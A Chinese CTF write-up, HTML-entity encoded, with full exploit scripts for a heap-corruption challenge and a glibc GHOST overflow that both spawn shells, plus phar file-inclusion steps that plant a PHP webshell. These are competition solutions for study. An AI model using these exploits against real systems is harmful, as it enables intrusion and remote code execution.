<p>&#x8FD9;&#x9053;&#x9898;&#x6CA1;&#x6709;&#x7ED9;libc&#x5E93;&#xFF0C;&#x4E0D;&#x8FC7;&#x6839;&#x636E;&#x6CC4;&#x9732;&#x7684;&#x4FE1;&#x606F;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#x7528;&#x7684;&#x5E93;&#x548C;shellman&#x662F;&#x540C;&#x4E00;&#x4E2A;&#xFF0C;&#x6240;&#x4EE5;&#x4E5F;&#x5C31;&#x76F8;&#x5F53;&#x4E8E;&#x6709;libc&#x5E93;&#x3002;</p>
<pre><code>&amp;#x5229<span class="comment">;&amp;#x7528;&amp;#x7684;&amp;#x811A;&amp;#x672C;&amp;#x5982;&amp;#x4E0B;&amp;#xFF1A;</span>
from zio import *
target = <span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;119.254.101.197&amp;apos;,10003)</span>
#target = <span class="keyword">&amp;apos</span><span class="comment">;./imdb&amp;apos;</span>
def add_tv<span class="list">(<span class="keyword">io</span>, name, session, rating, introduction)</span>:
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;?&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;1&amp;apos;)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;?&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">name</span>)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;?&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">str</span><span class="list">(<span class="keyword">session</span>)</span>)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;?&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">str</span><span class="list">(<span class="keyword">rating</span>)</span>)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;?&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">introduction</span>)</span>
def add_movie<span class="list">(<span class="keyword">io</span>, name, actors, rating, introduction)</span>:
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;?&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;2&amp;apos;)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;?&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">name</span>)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;?&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">actors</span>)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;?&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">str</span><span class="list">(<span class="keyword">rating</span>)</span>)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;?&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">introduction</span>)</span>
def remove_entry<span class="list">(<span class="keyword">io</span>, name)</span>:
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;?&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;3&amp;apos;)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;?&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">name</span>)</span>
def show_all<span class="list">(<span class="keyword">io</span>)</span>:
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;?&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;4&amp;apos;)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;bbbbbbbb&amp;apos;)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;actors: &amp;apos;)</span>
     d = io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;\n&amp;apos;).strip(&amp;apos;\n&amp;apos;)</span>
     malloc_addr = l64<span class="list">(<span class="keyword">d</span>.ljust<span class="list">(<span class="number">8</span>, <span class="keyword">&amp;apos</span><span class="comment">;\x00&amp;apos;))</span>
     print hex<span class="list">(<span class="keyword">malloc_addr</span>)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;bbbbbbbb&amp;apos;)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;actors: &amp;apos;)</span>
     d = io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;\n&amp;apos;).strip(&amp;apos;\n&amp;apos;)</span>
     heap_addr = l64<span class="list">(<span class="keyword">d</span>.ljust<span class="list">(<span class="number">8</span>, <span class="keyword">&amp;apos</span><span class="comment">;\x00&amp;apos;))</span>
     print hex<span class="list">(<span class="keyword">heap_addr</span>)</span>
     return malloc_addr, heap_addr
def exp<span class="list">(<span class="keyword">target</span>)</span>:
     io = zio<span class="list">(<span class="keyword">target</span>, timeout=10000, print_read=COLORED<span class="list">(<span class="keyword">RAW</span>, <span class="keyword">&amp;apos</span><span class="comment">;red&amp;apos;), print_write=COLORED(RAW, &amp;apos;green&amp;apos;))</span>
     add_tv<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;aaa&amp;apos;, 100, 200, &amp;apos;bbbb&amp;apos;) #0x602010</span>
     add_tv<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;aaa&amp;apos;, 100, 200, &amp;apos;bbbb&amp;apos;) #0x6020f0</span>
     add_tv<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;aaa&amp;apos;, 100, 200, &amp;apos;bbbb&amp;apos;) #0x6021d0</span>
     remove_entry<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;aaa&amp;apos;)</span>
     malloc_got = <span class="number">0</span>x0000000000601C58
     db_addr = <span class="number">0</span>x601dc0
     movie_vt = <span class="number">0</span>x00000000004015b0
     payload = l64<span class="list">(<span class="keyword">movie_vt</span>)</span> + <span class="keyword">&amp;apos</span><span class="comment">;a&amp;apos;*8 + &amp;apos;\x00&amp;apos;*56 + &amp;apos;b&amp;apos;*8 +&amp;apos;\x00&amp;apos;*(0x80-8) + l64(0x0000006443480000)+l64(malloc_got)</span>
     print len<span class="list">(<span class="keyword">payload</span>)</span>
     add_movie<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;ccc&amp;apos;, payload, 300, &amp;apos;eeee&amp;apos;) #0x602010 0x602110</span>
     add_tv<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;hhh&amp;apos;, 100, 200, &amp;apos;bbbb&amp;apos;) #0x6021e0</span>
     add_tv<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;hhh&amp;apos;, 100, 200, &amp;apos;bbbb&amp;apos;) #0x6022c0</span>
     add_tv<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;hhh&amp;apos;, 100, 200, &amp;apos;bbbb&amp;apos;) #0x6023a0</span>
     remove_entry<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;hhh&amp;apos;)</span>
     payload = l64<span class="list">(<span class="keyword">movie_vt</span>)</span> + <span class="keyword">&amp;apos</span><span class="comment">;a&amp;apos;*8 + &amp;apos;\x00&amp;apos;*56 + &amp;apos;b&amp;apos;*8 +&amp;apos;\x00&amp;apos;*(0x80-8) + l64(0x0000006443480000)+l64(db_addr)</span>
     add_movie<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;ccc&amp;apos;, payload, 300, &amp;apos;eeee&amp;apos;)</span>
     malloc_addr, heap_addr = show_all<span class="list">(<span class="keyword">io</span>)</span>
     io.gdb_hint<span class="list">()</span>
     add_tv<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;jjj&amp;apos;, 100, 200, &amp;apos;bbbb&amp;apos;) #0x6023b0</span>
     add_tv<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;jjj&amp;apos;, 100, 200, &amp;apos;bbbb&amp;apos;) #0x602490</span>
     add_tv<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;jjj&amp;apos;, 100, 200, &amp;apos;bbbb&amp;apos;) #0x602570</span>
     remove_entry<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;jjj&amp;apos;)</span>
     #local
     #addr2 = malloc_addr - <span class="number">0</span>x00007FFFF7277750 + <span class="number">0</span>x00007FFFF723B52C
     #remote
     addr2 = malloc_addr - <span class="number">0</span>x0000000000082750 + <span class="number">0</span>x000000000004652c
     fake_vt = <span class="number">0</span>x6023b0+8 - <span class="number">0</span>x602010 + heap_addr
     payload = l64<span class="list">(<span class="keyword">fake_vt</span>)</span> + <span class="keyword">&amp;apos</span><span class="comment">;/bin/sh;&amp;apos; + &amp;apos;\x00&amp;apos;*56 + &amp;apos;b&amp;apos;*8 +&amp;apos;\x00&amp;apos;*(0x80-8) + l64(0x0000006443480000)+l64(db_addr)</span>
     print len<span class="list">(<span class="keyword">payload</span>)</span>
     add_movie<span class="list">(<span class="keyword">io</span>, l64<span class="list">(<span class="keyword">addr2</span>)</span>, payload, <span class="number">300</span>, <span class="keyword">&amp;apos</span><span class="comment">;eeee&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;4&amp;apos;)</span>
     io.interact<span class="list">()</span>
exp<span class="list">(<span class="keyword">target</span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span>
</code></pre><h4 id="domain_db">domain_db</h4><h4 id="&#x6F0F;&#x6D1E;&#xFF1A;">&#x6F0F;&#x6D1E;&#xFF1A;</h4><p>&#x8BE5;&#x7A0B;&#x5E8F;&#x8C03;&#x7528;&#x4E86;gethostbyname&#xFF0C;&#x540C;&#x65F6;&#x63D0;&#x4F9B;&#x7684;libc&#x7684;&#x7248;&#x672C;&#x4E3A;2.15.&#xFF08;&#x901A;&#x8FC7;strings libc.so.6 | grep GLIBC&#x67E5;&#x770B;&#xFF09;&#xFF0C;&#x6240;&#x4EE5;&#x57FA;&#x672C;&#x786E;&#x5B9A;&#x662F;&#x53BB;&#x5E74;&#x7684;ghost&#x6F0F;&#x6D1E;&#x3002;</p>
<p>&#x56E0;&#x4E3A;&#x5F53;&#x65F6;&#x6F0F;&#x6D1E;&#x521A;&#x51FA;&#x6765;&#x65F6;&#xFF0C;&#x5927;&#x6982;&#x770B;&#x4E86;&#x4E00;&#x4E0B;&#x6F0F;&#x6D1E;&#xFF0C;&#x77E5;&#x9053;&#x6F0F;&#x6D1E;&#x4E3A;4&#x5B57;&#x8282;&#x6EA2;&#x51FA;&#x3002;&#x9700;&#x8981;&#x8FBE;&#x5230;&#x6EA2;&#x51FA;&#x9700;&#x8981;&#x6EE1;&#x8DB3;2&#x4E2A;&#x6761;&#x4EF6;&#xFF1A;</p>
<p>Gethostbyname&#x7684;name&#x53C2;&#x6570;&#x9700;&#x8981;&#x5927;&#x4E8E;0&#xD7;400&#xFF0C;&#x4E14;&#x5747;&#x4E3A;&#x6570;&#x5B57;&#x6216;&#x8005;.&#x53F7;&#x3002;</p>
<p>&#x901A;&#x8FC7;&#x5206;&#x6790;&#xFF0C;&#x53D1;&#x73B0;&#x8BE5;&#x6F0F;&#x6D1E;&#x53EF;&#x4EE5;&#x8986;&#x76D6;&#x4E0B;&#x4E00;&#x4E2A;&#x5806;&#x7684;size&#x4F4D;&#x3002;</p>
<h4 id="&#x5229;&#x7528;&#x8FC7;&#x7A0B;&#x5927;&#x81F4;&#x5982;&#x4E0B;&#xFF1A;">&#x5229;&#x7528;&#x8FC7;&#x7A0B;&#x5927;&#x81F4;&#x5982;&#x4E0B;&#xFF1A;</h4><p>1.&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#x7533;&#x8BF7;&#x4E86;0-10&#x4E2A;domain&#x3002;</p>
<p>2.&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#x91CA;&#x653E;domain1</p>
<p>3.&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#x8C03;&#x7528;gethostbyname&#xFF0C;&#x6B64;&#x65F6;&#x4FDD;&#x8BC1;gethostbyname&#x4E2D;&#x7533;&#x8BF7;&#x7684;&#x5806;&#x521A;&#x597D;&#x5B8C;&#x5168;&#x5360;&#x7528;domain1&#x91CA;&#x653E;&#x51FA;&#x6765;&#x7684;&#x5806;&#x3002;&#x8FD9;&#x6837;&#x521A;&#x597D;&#x80FD;&#x8986;&#x76D6;domain2&#x7684;size&#x4F4D;&#xFF0C;&#x8986;&#x76D6;&#x4E3A;0&#xD7;3231&#xFF0C;&#x5373;&#x5BF9;&#x5E94;ascii&#x4E2D;&#x7684;21&#x3002;</p>
<p>4.&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#x91CA;&#x653E;domain2&#x3002; &#x6B64;&#x65F6;domain2&#x7684;size&#x88AB;&#x4FEE;&#x6539;&#x4E86;&#xFF0C;&#x6240;&#x4EE5;&#x91CA;&#x653E;&#x65F6;&#x5806;&#x7BA1;&#x7406;&#x5668;&#x4F1A;&#x5C06;domain3-10&#x7684;&#x533A;&#x57DF;&#x4E5F;&#x56DE;&#x6536;&#x4E86;&#x3002;&#x6B64;&#x6B65;&#x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x8FC7;free check&#xFF0C;&#x6211;&#x8BA9;domain2_ptr + fake_size == av-&gt;top&#x3002;</p>
<p>5.&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#x4E4B;&#x540E;&#x518D;&#x6B21;&#x7533;&#x8BF7;&#x7A7A;&#x95F4;&#x65F6;&#xFF0C;&#x4F1A;&#x5C06;domain3-10&#x7684;&#x7A7A;&#x95F4;&#x4F1A;&#x88AB;&#x518D;&#x6B21;&#x5206;&#x914D;&#x3002;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4FEE;&#x6539;&#x5176;&#x4E2D;&#x67D0;&#x4E2A;domain&#x7684;name&#x6307;&#x9488;&#x4E3A;free_got&#x3002;</p>
<p>6.&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#x4E4B;&#x540E;&#x5229;&#x7528;&#x7A0B;&#x5E8F;&#x7684;show&#x548C;edit&#x529F;&#x80FD;&#x5BF9;free_got&#x8FDB;&#x884C;&#x8BFB;&#x53D6;&#x548C;&#x6539;&#x5199;&#x3002;</p>
<pre><code>&amp;<span class="comment">#x5229;&amp;#x7528;&amp;#x811A;&amp;#x672C;&amp;#x5982;&amp;#x4E0B;&amp;#xFF1A;</span>
<span class="keyword">from</span> zio <span class="keyword">import</span> *
target = (&amp;apos;<span class="number">119.254</span>.101.197&amp;apos;, <span class="number">10006</span>)
<span class="comment">#target = &amp;apos;./domain_db&amp;apos;</span>
<span class="function"><span class="keyword">def</span> <span class="title">add_domain</span><span class="params">(io, name)</span>:</span>
    io.read_until(&amp;apos;&amp;gt;&amp;apos;)
    io.writeline(&amp;apos;<span class="number">1</span>&amp;apos;)
    io.read_until(&amp;apos;:&amp;apos;)
    io.writeline(name)
<span class="function"><span class="keyword">def</span> <span class="title">lookup_domain</span><span class="params">(io, id)</span>:</span>
    io.read_until(&amp;apos;&amp;gt;&amp;apos;)
    io.writeline(&amp;apos;<span class="number">5</span>&amp;apos;)
    io.read_until(&amp;apos;:&amp;apos;)
    io.writeline(str(id))
<span class="function"><span class="keyword">def</span> <span class="title">edit_domain_name</span><span class="params">(io, id, new_name)</span>:</span>
    io.read_until(&amp;apos;&amp;gt;&amp;apos;)
    io.writeline(&amp;apos;<span class="number">2</span>&amp;apos;)
    io.read_until(&amp;apos;:&amp;apos;)
    io.writeline(str(id))
    io.read_until(&amp;apos;:&amp;apos;)
    io.writeline(new_name)
<span class="function"><span class="keyword">def</span> <span class="title">remove_domain</span><span class="params">(io, id)</span>:</span>
    io.read_until(&amp;apos;&amp;gt;&amp;apos;)
    io.writeline(&amp;apos;<span class="number">3</span>&amp;apos;)
    io.read_until(&amp;apos;:&amp;apos;)
    io.writeline(str(id))
<span class="function"><span class="keyword">def</span> <span class="title">list_domain</span><span class="params">(io)</span>:</span>
    io.read_until(&amp;apos;&amp;gt;&amp;apos;)
    io.writeline(&amp;apos;<span class="number">4</span>&amp;apos;)
    io.read_until(&amp;apos;&amp;lt;<span class="number">1</span>&amp;gt; &amp;apos;)
    free = l32(io.read(<span class="number">4</span>))
    <span class="keyword">print</span> hex(free)
    <span class="keyword">return</span> free
<span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(target)</span>:</span>
    io = zio(target, timeout=<span class="number">10000</span>, print_read=COLORED(RAW, &amp;apos;red&amp;apos;), print_write=COLORED(RAW, &amp;apos;green&amp;apos;))
    io.gdb_hint()
    add_domain(io, &amp;apos;<span class="number">0</span>&amp;apos; * (<span class="number">0x800</span> - <span class="number">16</span> - <span class="number">8</span> - <span class="number">1</span> - <span class="number">4</span> - <span class="number">3</span>)+&amp;apos;<span class="number">12</span>&amp;apos;) <span class="comment">#0 0x804c008 0x804c7f0</span>
    add_domain(io, &amp;apos;<span class="number">0</span>&amp;apos;*<span class="number">0x770</span>) <span class="comment">#1 0x804c878 0x804cff0  top=0x804d070</span>
    add_domain(io, &amp;apos;<span class="number">0</span>&amp;apos;*<span class="number">0x1a0</span>) <span class="comment">#2</span>
    add_domain(io, &amp;apos;/bin/sh&amp;apos;+&amp;apos;<span class="number">0</span>&amp;apos;*<span class="number">0x88</span>) <span class="comment">#3 0x0804d340 0x0804d2a8</span>
    add_domain(io, &amp;apos;<span class="number">0</span>&amp;apos;*<span class="number">0x10</span>) <span class="comment">#4 0x0804d3e0</span>
    add_domain(io, &amp;apos;<span class="number">0</span>&amp;apos;*<span class="number">0x5b0</span>) <span class="comment">#5</span>
    add_domain(io, &amp;apos;<span class="number">0</span>&amp;apos;*<span class="number">0x770</span>) <span class="comment">#6</span>
    add_domain(io, &amp;apos;<span class="number">0</span>&amp;apos;*<span class="number">0x770</span>) <span class="comment">#7</span>
    add_domain(io, &amp;apos;<span class="number">0</span>&amp;apos;*<span class="number">0x770</span>) <span class="comment">#8</span>
    add_domain(io, &amp;apos;<span class="number">0</span>&amp;apos;*<span class="number">0x770</span>) <span class="comment">#9</span>
add_domain(io, &amp;apos;/bin/sh;&amp;apos;+&amp;apos;<span class="number">0</span>&amp;apos;*(<span class="number">0x770</span>-<span class="number">8</span>)) <span class="comment">#10</span>
    remove_domain(io, <span class="number">1</span>)
lookup_domain(io, <span class="number">0</span>)
remove_domain(io, <span class="number">2</span>) <span class="comment"># top = 0x804d070 unsort=0x804d218</span>
    ptr_addr = <span class="number">0x0804b0a4</span>
    add_domain(io, &amp;apos;<span class="number">0</span>&amp;apos;*<span class="number">0x90</span>) <span class="comment">#1 0x0804d220</span>
    free_got = <span class="number">0x0804b004</span>
    payload2 = <span class="number">272</span>*&amp;apos;<span class="number">1</span>&amp;apos; + l32(free_got)
    add_domain(io, payload2)
    free = list_domain(io)
    <span class="comment">#local</span>
    system = <span class="number">0xb7e55060</span>
    <span class="comment">#remote</span>
    system = free - <span class="number">0x781b0</span> + <span class="number">0x3d170</span>
    edit_domain_name(io, <span class="number">1</span>, l32(system))
    remove_domain(io, <span class="number">10</span>)
    io.interact()
exp(target)
</code></pre><p>&#x6700;&#x597D;&#x7684;&#x8BED;&#x8A00;php</p>
<p>&#x9875;&#x9762;&#x5F88;&#x7B80;&#x5355;&#xFF0C;&#x6CA1;&#x4EC0;&#x4E48;&#x4FE1;&#x606F;&#xFF0C;&#x53D1;&#x73B0;&#x4E86;index.php.bak&#x6587;&#x4EF6;&#xFF0C;</p>
<p><img src="http://img0.tuicool.com/MZJ32eb.jpg" alt=""></p>
<p>&#x5176;&#x4E2D;&#x6570;&#x636E;&#x5E93;&#x8FDE;&#x63A5;&#x548C;sqli&#x8FC7;&#x6EE4;&#x90E8;&#x5206;&#x9690;&#x85CF;&#x4E86;&#xFF0C;&#x5C1D;&#x8BD5;&#x4E86;&#x4E00;&#x4E0B;&#x786E;&#x5B9E;&#x6CA1;&#x6709;sql&#x6CE8;&#x5165;&#x6F0F;&#x6D1E;&#x3002;&#x770B;&#x4EE3;&#x7801;&#x7684;&#x903B;&#x8F91;&#x5E94;&#x8BE5;&#x662F;&#x5728;$id==1024&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x67E5;&#x8BE2;&#x51FA;flag&#x3002;&#x5229;&#x7528;php&#x4E0E;mysql&#x5BF9;&#x6D6E;&#x70B9;&#x6570;&#x636E;&#x5904;&#x7406;&#x7CBE;&#x5EA6;&#x4E0D;&#x540C;&#x3002;?id=1024.[&#x82E5;&#x5E72;0]1&#xFF0C;&#x5C1D;&#x8BD5;&#x51E0;&#x4E2A;&#x5373;&#x53EF;&#x5F97;&#x51FA;flag&#x3002;</p>
<h4 id="&#x4FF3;&#x53E5;&#x81EA;&#x52A8;&#x6253;&#x5206;&#x7CFB;&#x7EDF;">&#x4FF3;&#x53E5;&#x81EA;&#x52A8;&#x6253;&#x5206;&#x7CFB;&#x7EDF;</h4><p>&#x8FD9;&#x9053;&#x9898;&#x96BE;&#x5EA6;&#x6709;&#x4E24;&#x70B9;&#xFF0C;&#x4E00;&#x4E2A;&#x662F;&#x6587;&#x4EF6;&#x5305;&#x542B;&#x6F0F;&#x6D1E;&#x7684;&#x5229;&#x7528;&#xFF0C;page=php://filter/convert.base64-encode/resource=index,&#x53EF;&#x4EE5;&#x770B;&#x5230;index.php&#x6587;&#x4EF6;&#x6E90;&#x7801;base64&#x7F16;&#x7801;&#x4E4B;&#x540E;&#x7684;&#x4EE3;&#x7801;&#x3002;&#x5206;&#x6790;&#x4E4B;&#x540E;&#x53EF;&#x4EE5;&#x770B;&#x5230;xxtp&#x534F;&#x8BAE;&#x5DF2;&#x7ECF;&#x8FC7;&#x6EE4;&#xFF0C;&#x800C;&#x4E14;&#x6700;&#x540E;include&#x8BED;&#x53E5;&#x4F1A;&#x52A0;&#x4E0A;.php&#x540E;&#x7F00;&#x3002;phar&#x534F;&#x8BAE;&#x53EF;&#x4EE5;&#x6784;&#x9020;&#x51FA;&#x53EF;&#x5305;&#x542B;&#x7684;poc&#x3002;</p>
<p>&#x7F51;&#x4E0A;&#x641C;&#x7684;phar&#x6253;&#x5305;&#x7684;&#x4EE3;&#x7801;&#xFF1A;</p>
<pre><code>&amp;<span class="keyword">lt</span>;?php
try{
    <span class="variable">$p</span> = new Phar(dirname(__FILE_<span class="number">_</span>) . &amp;quot;<span class="keyword">my</span>.phar&amp;quot;, <span class="number">0</span>, &amp;apos;<span class="keyword">my</span>.phar&amp;apos;);
} catch (UnexpectedValueException <span class="variable">$e</span>) {
    <span class="keyword">die</span>(&amp;apos;Could <span class="keyword">not</span> <span class="keyword">open</span> <span class="keyword">my</span>.phar&amp;apos;);
} catch (BadMethodCallException <span class="variable">$e</span>) {
    echo &amp;apos;technically, this cannot happen&amp;apos;;
}
<span class="variable">$p</span>-&amp;<span class="keyword">gt</span>;startBuffering();
<span class="variable">$p</span>[&amp;apos;<span class="number">1</span>.php&amp;apos;] = file_get_contents(&amp;apos;shell.php&amp;apos;);
<span class="variable">$p</span>-&amp;<span class="keyword">gt</span>;setStub(&amp;quot;&amp;<span class="keyword">lt</span>;?php
    Phar::mapPhar(&amp;apos;myphar.phar&amp;apos;);
__HALT_COMPILER();&amp;quot;);
<span class="variable">$p</span>-&amp;<span class="keyword">gt</span>;stopBuffering();
?&amp;<span class="keyword">gt</span>;
</code></pre><p>&#x4E0A;&#x9762;&#x4EE3;&#x7801;&#x4F1A;&#x628A;shell.php&#x6253;&#x5305;&#x7684;phar&#x5305;&#x4E2D;&#x53BB;&#x3002;&#x56E0;&#x4E3A;&#x534F;&#x8BAE;&#x662F;&#x5BF9;&#x672C;&#x5730;&#x6587;&#x4EF6;&#x5305;&#x542B;&#xFF0C;&#x5728;robots.txt&#x4E2D;&#x627E;&#x5230;txt&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x8DEF;&#x5F84;&#xFF0C;&#x4E14;&#x4F1A;&#x8FD4;&#x56DE;&#x6587;&#x4EF6;&#x540D;&#x3002;&#x5C06;phar&#x5305;&#x6539;.txt&#x6587;&#x4EF6;&#x540D;&#x4E0A;&#x4F20;&#xFF0C;&#x6784;&#x9020;poc&#xFF1A;</p>
<pre><code>?page=phar:<span class="comment">//upload_paiju/Eny2CRWfkt91Gf69.txt/1</span>
</code></pre><p>&#x8FD9;&#x6837;&#x5305;&#x542B;&#x4E4B;&#x540E;&#x7684;&#x8DEF;&#x5F84;&#x5C31;&#x662F;</p>
<pre><code><span class="function"><span class="title">Include</span><span class="params">(upload_paiju/Eny2CRWfkt91Gf69.txt/<span class="number">1</span>.php)</span></span>
</code></pre><p>&#x5176;&#x4E2D;Eny2CRWfkt91Gf69.txt/1.php&#x662F;&#x5BF9;phar&#x5305;&#x4E2D;1.php&#x6587;&#x4EF6;&#x7684;&#x8BBF;&#x95EE;&#x65B9;&#x5F0F;&#xFF08;&#x53EF;&#x4EE5;&#x67E5;&#x4E00;&#x4E0B;phar&#x7528;&#x6CD5;&#xFF09;&#x3002;</p>
<p>&#x83B7;&#x5F97;&#x4E86;webshell&#x3002;</p>
<p>&#x5728;&#x7B2C;&#x4E00;&#x5929;&#xFF0C;&#x6211;&#x7528;&#x7684;eval&#x4E00;&#x53E5;&#x8BDD;&#x6728;&#x9A6C;&#xFF0C;eval&#x53EF;&#x7528;&#xFF0C;&#x4F46;&#x662F;&#x811A;&#x672C;&#x8FC7;&#x51E0;&#x79D2;&#x949F;&#x5C31;&#x4F1A;&#x88AB;&#x5220;&#x9664;&#x3002;&#x800C;&#x4E14;&#x6CA1;&#x6709;&#x627E;&#x5230;flag&#x6587;&#x4EF6;&#x3002;</p>
<p>&#x7B2C;&#x4E8C;&#x5929;&#x670D;&#x52A1;&#x91CD;&#x5F00;&#x4E4B;&#x540E;&#xFF0C;&#x53D1;&#x73B0;eval&#x6728;&#x9A6C;&#x7528;&#x4E0D;&#x4E86;&#x4E86;&#xFF0C;&#x56E0;&#x4E3A;&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x8FC7;&#x6EE4;&#x6BD4;&#x8F83;&#x4E25;&#x683C;&#xFF0C;&#x53EF;&#x80FD;&#x88AB;&#x8FC7;&#x6EE4;&#x4E86;&#xFF0C;&#x5C31;&#x6362;&#x4E86;preg_replace&#x5199;&#x7684;&#x4E00;&#x53E5;&#x8BDD;&#xFF0C;&#x53EF;&#x7528;&#x3002;&#x690D;&#x5165;&#x4EE3;&#x7801;ini_get_all()&#x83B7;&#x5F97;&#x6240;&#x6709;&#x7684;php.ini&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x3002;&#x5176;&#x4E2D;&#x770B;&#x5230;&#x88AB;&#x5141;&#x8BB8;&#x7684;&#x8DEF;&#x5F84;&#x53EA;&#x6709;&#x7F51;&#x7AD9;&#x6839;&#x76EE;&#x5F55;&#x3001;tmp&#x3001;&#x548C;/srv&#xFF08;&#x8FD9;&#x662F;&#x4EC0;&#x4E48;&#x9B3C;&#xFF1F;&#xFF09;</p>
<p>Flag&#x5C31;&#x5728;/srv&#x4E0B;&#x8EBA;&#x7740;&#x4E86;&#x3002;</p>
<p>&#x8FD9;&#x79CD;&#x9898;&#x76EE;&#x6BD4;&#x8F83;&#x597D;&#x73A9;&#xFF0C;&#x4F30;&#x8BA1;&#x662F;&#x524D;&#x9762;&#x8FDB;&#x53BB;&#x7684;&#x4EBA;&#x5199;&#x4E86;php&#x811A;&#x672C;&#x8FC7;&#x51E0;&#x79D2;&#x5C31;&#x5220;&#x9664;&#x522B;&#x4EBA;&#x4E0A;&#x4F20;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x7B2C;&#x4E8C;&#x5929;&#x5C31;&#x4E0D;&#x5B58;&#x5728;&#x8FD9;&#x79CD;&#x95EE;&#x9898;&#x4E86;&#xFF0C;&#x9047;&#x5230;&#x7684;&#x95EE;&#x9898;&#x548C;&#x540E;&#x6765;&#x4E0A;&#x6765;&#x7684;&#x5F88;&#x5927;&#x4E0D;&#x540C;&#xFF0C;&#x574F;&#x4EBA;&#x589E;&#x591A;&#x4E86;&#x3002;</p>
<h4 id="Flager-checker">Flager-checker</h4><p>&#x770B;&#x4E0B;&#x6E90;&#x7801;&#xFF0C;&#x53EA;&#x8981;&#x6EE1;&#x8DB3;&#x8FD9;&#x4E00;&#x884C;&#x5C31;&#x53EF;&#x4EE5;&#xFF1A;</p>
<p><img src="http://img1.tuicool.com/bmAJZn3.jpg" alt=""></p>
